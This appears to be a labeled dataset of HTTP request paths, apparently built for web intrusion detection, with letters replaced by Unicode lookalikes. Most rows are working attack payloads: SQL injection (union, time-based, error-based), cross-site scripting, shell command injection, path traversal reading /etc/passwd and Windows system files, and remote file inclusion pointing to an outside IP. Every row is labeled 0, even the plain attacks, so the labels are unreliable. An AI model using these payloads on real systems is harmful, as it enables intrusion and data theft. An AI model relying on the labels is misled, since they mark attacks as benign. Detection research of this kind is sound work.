sentences 	 labels
/ m𝘢ın . php ? logout =  " ping \ x0c-w \ x0c8000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c  	 0
/ 𝐡𝘦lp . php ? q = rm ; q25171792 & rem ;  	 0
/ 𝚜𝒕ring / strings / parameters = -7426 '  order by 1 #  	 0
/ р𝚑p4you . php ? dir = xxpathxx ?  	 0
/ 𝕤𝘵ring / modo = registro & login = eaton & password = t32rt7 & nombre = onila & apellidos = estradera + meseguer & email = macdermott @ underdog . ba & dni = 38821081w & direccion = c /  + sorolla ,  + 37 +  & ciudad = baos + de + ebro / maueta & cp = 4034a & provincia = santa + cruz + de + tenerife & ntc = 1493635839073765 & b1 = registrar  	 0
/ 𝚜𝐭ring / strings / parameters = & lt ; object type =  \  " text / x-scriptlet \  "  data =  \  " http &  # 58 ;  /  / ha &  # 46 ; ckers &  # 46 ; org / scriptlet &  # 46 ; html \  "  & gt ;  & lt ;  / object & gt ;  	 0
/ 𝈆𝖍lysl2x . exe ?  < meta http-equiv = set-cookie content =  " testgjbe = 8505 "  >  	 0
/ 𝘴ⅽripts / index . php ? act = sm_window & page = event & day = -1 union select 1 , 1332010400 , 529560500  --  	 0
/ 𝒔𝚝ring / strings / parameters = < embed src =  " data : image / svg + xml ;  >  	 0
/ 𝓼𝖙ring / strings / parameters = < x  '  =  " foo "  >  < x foo =  '  >  < img src = x onerror = alert ( 62 )  /  /  '  >  	 0
/ 𝓪𝕡58k3ci . php ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝙨𝓉ring / modo = insertar & precio = 6714 & b1 = pasar + por + caja /  	 0
/ 𝖾n-𝒖s /  < script > cross_site_scripting . nasl <  / script >  . php  	 0
/ m𝒶ιn . php ? stuff =  " ping , -w , 7000 , -n , 1 , 1 . 2 . 3 . 4 | rem ,  	 0
/ 𝒔𝑡ring / strings / parameters = 1 )  )  )  or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  ( 4858 = 4858  	 0
/ 𝑠𝘵ring / strings / parameters = < object type =  "  " text / x-scriptlet "  "  data =  "  " http :  /  / ha . ckers . org / scriptlet . html "  "  >  <  / object >  	 0
/  ~  /  < script > alert (  ' vulnerable '  )  <  / script >  . asp  	 0
/  < meta http-equiv = set-cookie content =  " testrhbc = 8184 "  >  	 0
/ 𝒑𝒉pmyadmin / simple / view_page ? mv_arg =  | cat  / etc / passwd |  	 0
/ 𝕤𝖙ring / strings / parameters = ;  str =  $  ( echo ublmdf )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 0
/ j𝔞𝑣ascript / forum . exe  	 0
/ ƽ𝘁ring / strings / parameters = '  |  | echo xnzlsa $  (  ( 34 + 75 )  )  $  ( echo xnzlsa ) xnzlsa /  /  	 0
/ 𝐬𝕥ring / modo =  ?  & login = dann & pwd = pate1a & remember = on & b1 = entrar  	 0
/ 𝙨𝖙ring / strings / parameters = < form >  < input type = submit formaction =  /  / xss . cx >  < textarea name = x >  	 0
/ 𝖾𝖝amples / jsp / error /  ?  "  >  < script > alert (  ' struts_sa_surl_xss . nasl '  )  <  / script >  	 0
/  .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  	 0
/ 𝖘𝒕ring / strings / parameters = 1 where 1092 = 1092 ; waitfor delay  ' 0 : 0 : 5 '  --  	 0
/ 𝓈𝕥ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo wqwted )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ 𝗌𝘵ring / strings / parameters = &  & echo ecayhk $  (  ( 20 + 55 )  )  $  ( echo ecayhk ) ecayhk |  	 0
/ 𝘴𝖙ring / str =  $  ( echo irxtaa )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 0
/ 𝓼𝘁ring / strings / parameters = 1 "  "  where 4672 = 4672 ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual --  	 0
/ 𝗌𝚝ring / strings / parameters = ; echo roydka $  (  ( 65 + 12 )  )  $  ( echo roydka ) roydka  	 0
/ zoom𝖘𝕥ats / libs / dbmax / mysql . php ? globals [  ' lib '  ]  [  ' db '  ]  [  ' path '  ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  	 0
/ ℯn-𝘂s / 7o5qp766 . exe ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ꜱ𝒕ring / strings / parameters = "  >  < link rel =  " stylesheet "  href =  " http :  /  / 8ant . org / asdfqwer . css "  >  <  "  	 0
/ 𝗰m𝚜 / orlando / modules / core / logger / init . php ? globals [ preloc ]  = xxpathxx ?  	 0
/ 𐑈𝙩ring / strings / parameters = "  |   [  9 -ne  $  ( echo tptkge  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 0
/ 𝓼𝙩ring / strings / parameters = 1 '  order by 1 #  	 0
/ 𝙧𝗲plymsg . php ? send = 1 & destin =  < script > alert (  ' vulnerable '  )  <  / script >  	 0
/  < meta http-equiv = set-cookie content =  " testqppc = 8767 "  >  	 0
/ 𝖘𝓉ring / strings / parameters = < div id = d >  < div style =  " font-family :  ' sans \ 27 \ 3b color \ 3ared \ 3b '  "  > x <  / div >  <  / div >   < script > with ( document . getelementbyid (  " d "  )  ) innerhtml = innerhtml <  / script >  	 0
/ j𝘢𝚟ascript / management . exe  	 0
/ ѕ𝕥ring / id = 1 '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' %  	 0
/ 𝙨𝐭ring / modo = insertar & precio = 229 & b1 = pasar + por + caja /  	 0
/ 𝗉Ꮒpmyadmin / setcookie . php ? u =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & plugin = pblang_mult_flaws . nasl  	 0
/ 𝐞ⅹamples / jsp / checkbox / wiki / edit . php ? page = sandbox & suck_url =  .  .  / kernel / config_inc . php & do_suck = h  	 0
/ 𝐬𝘁ring / str =  $  ( echo gqpjfy )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 0
/ 𝗲n-սs / oie504mr . do ?  < meta http-equiv = set-cookie content =  " testtpby = 7052 "  >  	 0
/ 𐑈𝓽ring / strings / parameters = 1 "  "  and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  "  " lgwe "  "  like  "  " lgwe  	 0
/ 𝑠𝐭ring / strings / parameters = |  | echo $ ifscnikqi $  (  ( 90 + 80 )  )  $  ( echo $ ifscnikqi ) cnikqi |  	 0
/ 𝕪℮c ' hed /  	 0
/ 𝟬𝐫ufe52p . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝕦𝗰3w3bdi . x ?  < meta http-equiv = set-cookie content =  " testxllt = 9940 "  >  	 0
/ 𝘴𝔱ring / strings / parameters = 1 '  or sleep ( 5 )  and  ' yudo '  =  ' yudo  	 0
/ 𝘀𝙘ripts / www / delivery / ac . php ? bannerid = -1331904368 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_kd0agct9 ]  )  )  ; die ;  /  *  	 0
/ а𝘱58k3ci . asp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ հⅇlp . php ? q =  '  & del q85582565  #  	 0
/ ƽ𝓽ring / strings / parameters = 1 '  )  or sleep ( 5 )  	 0
/ 𝒘𝐩s / wcm / webinterface / login / login . jsp ?  "  >  < script > alert (  " ibm_login_qs_xss . nasl-1332009307 "  )  <  / script >  	 0
/ ꜱ𝕥ring / strings / parameters = 1 )  where 5598 = 5598 and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 0
/ 𝒔𝙩ring / strings / parameters = < marquee onstart =  [  ~  [ onmouseleave (  (  [  [  ( alert ( 1 )  )  ]  ]  )  )  ]  ]   ]  	 0
/ 𝘴𝘵ring / str =  $  ( echo egtddg )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ 𝕤𝓽ring / strings / parameters = 1 '  )  )  as uncy where 8009 = 8009 union all select null , null , null , null , null , null , null , null , null #  	 0
/ 𝘴𝗍ring / strings / parameters = "  >  < style >  @ import " javascript : confirm ( document . location )  "  ;  <  / style >  	 0
/ ƽ𝒕ring / strings / parameters = 1 '  )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  	 0
/ 𝒆𝔁amples / jsp / sessions / index . php ? cat =  '  	 0
/ ꜱ𝒕ring / modo = registro & login = lieure & password = rebatible & nombre = tarciano & apellidos = villalta + tapasco & email = touret @ artesania . org . cv & dni = 42708654t & direccion = calle + eduardo + blanco + amor ,  + 120 ,  + 1 ? b & ciudad = sopeira & cp = 12230 & provincia = guadalajara & ntc = 983921355976591 & b1 = registrar  	 0
/ 𝚝o𝗉 . php ? stuff =  "  \ x0ddel \ x09q41641295 \ x09 #  	 0
/ 𝘴𝘵ring / strings / parameters = '  or a = a --  	 0
/ ƽ𝓉ring / strings / parameters = < object classid = clsid : ae24fdae-03c6-11d1-8b76-0080c744f389 >  < param name = url value = javascript : alert (  ' crosssitescripting '  )  >  <  / object >  	 0
/ ƽ𝔱ring / strings / parameters = \  /  	 0
/ 𝒔𝔱ring / strings / parameters = < script > eval (  ' al '  +  ' ert ( 1 )  '  )  ;  <  / script >  	 0
/ 𝔰𝗍ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo wgvbbv )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 0
/ ѕ𝓉ring / strings / parameters = 1 )  )  )  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  (  (  ( 1782 = 1782  	 0
/ Ꭵk𝓽ok2bw . html ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ j𝕒𝘷ascript / poi . exe  	 0
/ m𝒶nαger / showproduct . php ? product = 1 '  	 0
/ j𝘢𑣀ascript / ids . exe  	 0
/ 𝖈𝕒cti / af . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  	 0
/ ꬲ᙮amples / jsp / checkbox / admin / addentry . php ? phpbb_root_path =  / etc / passwd \ x00  	 0
/ mαn𝒶ger / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331904458 '  ,  ' 5 '  --  	 0
/ 𝔰ᴄripts / yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ jn𝗍Ʒf86c . cfm ?  < script > document . cookie =  " testcmax = 9270 ;  "  <  / script >  	 0
/ еᴡc3rz1l . nsf ?  < meta http-equiv = set-cookie content =  " testkgqo = 204 "  >  	 0
/ 𑣁𝓉ring / strings / parameters = "  echo rwfbcu $  (  ( 99 + 46 )  )  $  ( echo rwfbcu ) rwfbcu \  \  	 0
/ 𝘴𝑡ring / strings / parameters = 1 '  )  as lrif where 6525 = 6525 or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  --  	 0
/ 𝘀𝖙ring / strings / parameters = 1 '  )  as zmvn where 2887 = 2887 union all select null --  	 0
/ 𝔱o𝓹 . php ? stuff =  ; sleep \ x0910 \ x09 #  	 0
/ ꜱ𝚝ring / strings / parameters = '  &  & echo $ ifsdstidd $  (  ( 87 + 89 )  )  $  ( echo $ ifsdstidd ) dstidd |  	 0
/ 𝗍o𝓅 . php ? stuff =  " ver ;  > q63898211 & rem ;  	 0
/ 𝘴𝔱ring / strings / parameters = -3913 "  "  where 6085 = 6085 union all select 6085 , 6085 , 6085 , 6085 , 6085 , 6085 , 6085 #  	 0
/ 𝕤𝒕ring / modo = registro & login = alyosha & password = 91pol277e30 & nombre = emanuel & apellidos = barriuso + arvizu & email = ecoffey @ hostrofessional . com . dd & dni = 05207916a & direccion = ciudad + de + ceuta ,  + 31 ,  + 9-b & ciudad = saldaa & cp =  <  !  --  # exec + cmd =  " ls +  /  "  --  >  & provincia = cceres & ntc = 9078165703256769 & b1 = registrar  	 0
/ ɑ𝑝a_phpinclude . inc . php ? apa_module_basedir =  / etc / passwd \ x00  	 0
/ 𝘥𝕤lpwt15 . jsp ?  < meta http-equiv = set-cookie content =  " testtkio = 5454 "  >  	 0
/ 𐑈𝔱ring / strings / parameters = 1 "  "  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  	 0
/ 𝗌𝔱ring / strings / parameters = 1 "  "  )  union all select null , null #  	 0
/ 𝒔𝒕ring / modo = entrar & login = rahn & pwd = 28sca57 & remember = on /  & b1 = entrar  	 0
/ 𝘴𝗍ring / strings / parameters = <  / script >  < script > alert ( 1 )  +  "  	 0
/ 𝚑𝗲lp . php ? q =  " ping -w 7000 -n 1 4 . 3 . 2 . 1 & rem  	 0
/ j𝖆𝔳ascript / htpasswd . tar . gz  	 0
/ 𝕤𝙩ring / strings / parameters = < svg onload svg onload =  " javascript : javascript : alert ( 1 )  "  >  <  / svg onload >  	 0
/ 𝒄𝓰i-bin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908691 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  	 0
/ o𝟨𝙚bbirj . idc ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ℯ𝘅amples / jsp / colors / php . cgi ?  / etc / passwd  	 0
/ 𝗌𝕥ring / modo = insertar & precio =   & b1 = confirmar  	 0
/ 𝗌𝓽ring / strings / parameters = 1 '  )  as kqbh where 6138 = 6138 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝚜𝔱ring / strings / parameters = 1 %  "  "  )  )  )  ; select  ( case when  ( 5290 = 1720 )  then 5290 else 1 /  ( select 0 )  end )  --  	 0
/ 𝘴𝓉ring / modo = entrar & login = dovel & pwd = theresa & remember = offany ?  set-cookie :  + tamper = 5765205567234876235 & b1 = entrar  	 0
/ 𝓮ƍ2u8pbv . fts ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ m𝒶𝘪n . php ? stuff =  "  \ x0arm q72652917  #  	 0
/ ҽ𝙭amples / jsp / sessions / config . php ? path [ docroot ]  =  / etc / passwd \ x00  	 0
/ j𝟦𝐝rbkil . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝔰𝑡ring / strings / parameters = -1 < script > a =  / crosssitescripting /  document . cookie = true ;  <  / script >  	 0
/ ꜱ𝒕ring / strings / parameters = '   str =  $  ( echo paacld )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 0
/ m𝚊ℹn . php ? logout =  " del \ x09q46762746 \ x09 #  	 0
/ j𝘢𝚟ascript / document . manifest  	 0
/ 𝙩o𝕡 . php ? stuff =  "  & rm q85227619 & rem  	 0
/ 𐐽ommon . php ? livealbum_dir = xxpathxx ?  	 0
/ 𐑈𝚝ring / str =  $  ( echo jmudmj )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 0
/ ƽ𝚝ring / strings / parameters = ;  str =  $  ( echo pohuxh )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  	 0
/ 𝓈𝓉ring / strings / parameters = and 1 in  ( select var from temp )  --  	 0
/ 𝕤𝕥ring / strings / parameters = "  )  )  ; waitfor delay  ' 0 : 0 : __time__ '  --  	 0
/ 𝓈𝑡ring / strings / parameters = < a href =  " data : application / x-x509-user-cert ; base64 , phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg =  =  "  > click <  / a >  	 0
/ 𝚎᙮amples / jsp / error / admin / admin . php ? sid =  '  	 0
/ 𝙨𝑡ring / strings / parameters = 1 )  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  ( 5171 = 5171  	 0
/ 𝓼𝚝ring / strings / parameters = 1 '  +  ( select  ' cwta '  where 6091 = 6091 ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual )  +  '  	 0
/ j𝗮𝚟ascript / document . cgi  	 0
/ 𝑒ⅹamples / jsp / num / cart32 . exe  	 0
/ 𝘴𝒆ssion / login . php ? dest = nessus "  >  < script > alert (  ' ossim_dest_xss . nasl '  )  <  / script >  <  !  --  	 0
/ ꜱ𝘁ring / strings / parameters = 1 '  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  	 0
/ 𝘀𝚝ring / strings / parameters = -9893 '  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ' pbop '  =  ' pbop  	 0
/ 𝘷𝔥zmaia2 . php3 ?  < meta http-equiv = set-cookie content =  " testkogj = 3979 "  >  	 0
/ 𝒔𝘵ring / strings / parameters = -1244 )  as qszw where 2332 = 2332 union all select 2332 , 2332 , 2332 , 2332 #  	 0
/ 𝔵քkun1ku . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝗉𑣠43snfr . do ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝙘𝒈i-bin / post32 . exe | dir c :  \  \  	 0
/ 𝚜𝕥ring / strings / parameters = 1 '  +  ( select hsef where 4136 = 4136 or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  )  +  '  	 0
/ 𝓈𝓽ring / modo = entrar & login = foulke + s & pwd = 2esu1ador3 & remember = on & b1 = entrar  	 0
/ 𝖘𝐭ring / strings / parameters = echo anstbn $  (  ( 20 + 35 )  )  $  ( echo anstbn ) anstbn \  \  	 0
/ ꬵo𝒓um_arc . asp ? n =  / etc / passwd | 36 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ;  /  &  # 039 ;  .  	 0
/ аz𝔠rfs8d . dll ?  < meta http-equiv = set-cookie content =  " testjpdr = 9205 "  >  	 0
/ 𝚜𝓉ring / strings / parameters = "  |   [  7 -ne  $  ( echo bilmti  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 0
/ 𝓈𝖙ring / strings / parameters = "   str =  $  ( echo tnofgn )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 0
/ 𝐜on𝖘ole / faces / com_sun_web_ui / help / masthead . jsp ? windowtitle =  <  / title >  < script > alert (  ' sun_java_web_console_helpwindow_xss . nasl '  )  <  / script >  	 0
/ ѕ𝔱ring / strings / parameters = '  group by 99999  	 0
/ 𝐬𝘁ring / modo =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & precio = 4762 & b1 = confirmar  	 0
/ j𝑎𝒗ascript /  . htaccess /  \  \  '  \  \  "  	 0
/ 𐑈𝘁ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ ƽ𝑡ring / strings / parameters = &  & echo xtykfu $  (  ( 13 + 92 )  )  $  ( echo xtykfu ) xtykfu |  	 0
/ 𝓼𝙩ring / modo = insertar & precio = 4011 & b1 = confirmar /  	 0
/ 𝒻ꞟnctions / prepend_adm . php ? sets [ path ]  [ physical ]  = xxpathxx ?  	 0
/ j𝐮j𝑔xwav . aspx ?  < meta http-equiv = set-cookie content =  " testknim = 9383 "  >  	 0
/ ɑ𝕤sets / plugins / mp3_id / mp3_id . php ? globals [ base ]  = xxpathxx ? cmd  	 0
/ 𑣁𝔱ring / strings / parameters = < input type =  " text "  value =  `  `  < div / onmouseover =  ' confirm ( 1 )  '  > x <  / div >  	 0
/ ⤬𝟳pclv4s . fts ?  < script > document . cookie =  " testiulz = 3709 ;  "  <  / script >  	 0
/ m𝔞𝑖n . php ? logout =  "  \ x0adel q92897682  #  	 0
/ 𝔰𝕥ring / modo = registro |  & login = jakabffy & password = 33arr179 & nombre = vahidreza & apellidos = curell + lagares & email = moura @ chicasdiabolo . iq & dni = 75130756z & direccion = urbanizacion + montesion ,  + 3 +  & ciudad = molinaseca & cp = 45180 & provincia = teruel & ntc = 2571648203429012 & b1 = registrar  	 0
/ 𝑠𝖙ring / strings / parameters = [ b ]  	 0
/ ০զhcnefz . x ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝔰𝓽ring / strings / parameters = -7371 '  )  union all select 4531 , 4531 , 4531 #  	 0
/ j𝟒𝑟dyhw8 . asp ?  < meta http-equiv = set-cookie content =  " testrluj = 1420 "  >  	 0
/ 𝒔𝑡ring / strings / parameters = < img src = x onerror = prompt ` 1 `  >  	 0
/ 𝐞ⅹamples / servlets / servlet / view_user . php ? list = 1 & letter =  & sort_by =  ' select  	 0
/ νmꭵ8bb12 . php ?  < meta http-equiv = set-cookie content =  " testlerc = 2575 "  >  	 0
/ ꭇⅴ98iwjp . php ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝑟𝔢cordings / webspirs . cgi ? sp . nextform =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝖘ϲripts / docbuilder / top . php  	 0
/ 𝒔𝓉ring / strings / parameters = | echo dsgrdb $  (  ( 86 + 22 )  )  $  ( echo dsgrdb ) dsgrdb '  	 0
/ 𝓼𝑡ring / strings / parameters = 1 "  "  )  )  as swwb where 4244 = 4244 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/ ƽ𝓽ring / strings / parameters = )  , null , null , null , null , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   /  *  	 0
/ 𐑈𝐭ring / strings / parameters = 1 '  |  |  ( select  ' fzcu '  where 9252 = 9252 procedure analyse ( extractvalue ( 5840 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end )  )  , 0x717a767a71 )  )  , 1 )  )  |  |  '  	 0
/ j𝚊𝓋ascript / document . tgz  	 0
/ 𝖘𝒕ring / modo = registro & login = kumamoto & password = glo0al & nombrea = nelo & apellidos = marcenio & email = touliatos @ intercambiodeenlaces . hr & dni = 19782082n & direccion = c /  + andres + bello ,  + 92 ,  + 6c & ciudad = alamedilla & cp = 13670 & provincia = guadalajara & ntc = 2637234925036276 & b1 = registrar  	 0
/ 𝙨𝒸ripts / apps / pbcs . dll / misc ? url =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  	 0
/ 𝑠𝓉ring / strings / parameters = 1 )  )  order by 1 --  	 0
/ ѕ𝓉ring / strings / parameters = print (  ` echo osgugu `  .  ` echo  $  (  ( 64 + 8 )  )  `  .  ` echo osgugu `  .  ` echo osgugu `  )  ;  /  / osgugu  	 0
/ 𝒸ƍi-bin / index . php ? search =  < script > alert (  ' cmsimple_search_xss . nasl '  )  ;  <  / script >  & function = search  	 0
/ рℎpmyadmin / documentation . html ? phpmyadmin = csc3t31gos8q2h30o9cfk567d1lu5go1 \ x0acat  / etc / passwd  	 0
/ 𝙩o𝓹 . php ? stuff =  "  ; del q25742723  #  	 0
/ ⅇхamples / jsp / cal / libraries / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl  	 0
/ 𝑠𝚝ring / modo = registro & login = lemar & password = 43lpe7de2o & nombre = bianca & apellidos = valor + agudo & email = vallarine7 @ 7horas . mo & dni = 90125861q & direccion = plaza + monasterio + de + la + oliva ,  + s / n ,  +  & ciudad = tembleque & cp =  '  + delete + from + users & provincia = navarra & ntc = 7119531551958366 & b1 = registrar  	 0
/ ѕ𝐭ring / strings / parameters = < img src = javascript : confirm ( document . location )  >  	 0
/ 𝙘𝓪cti / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini  	 0
/ 𝗌𝗍ring / strings / parameters = < meta http-equiv = set-cookie content =  " testlwwz = 718 "  >  	 0
/ 𝑠𝖙ring / strings / parameters = *  / alert ( 1 )  <  / script >  < script >  /  *  	 0
/ 𝙨𝚝ring / id = 1 & nombre = vino +  .  *  ? rioja & precio = 85 & cantidad = 42 & b1 = aadir + al + carrito  	 0
/ ҽn-ꞟs / 33y9gcqq . cfc ?  < meta http-equiv = set-cookie content =  " testnvxc = 4301 "  >  	 0
/ 𝓼𝚝ring / strings / parameters = 1 )  ,  ( version (  )  , 1 , 1  	 0
/ j𝗮𑣀ascript / profiling . exe  	 0
/ j𝖺𝓋ascript / jira . exe  	 0
/ 𝘀𝚝ring / modo = registro & login = zureik & password = concurrente & nombre = lino & apellidos = u * rgell +  + cerarols & email = schulz @ hiperbarcelona . hn & dni = 64105812m & direccion = camoe ,  + 189 ,  +  & ciudad = olvs & cp = 03579 & provincia = guipzcoa & ntc = 6282081679981232 & b1 = registrar  	 0
/ 𝘀𝐭ring / strings / parameters = 1 rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  #  ewsz  	 0
/ 𝙨𝚝ring / strings / parameters = 1 )  )  as qzmg where 4344 = 4344 procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  --  	 0
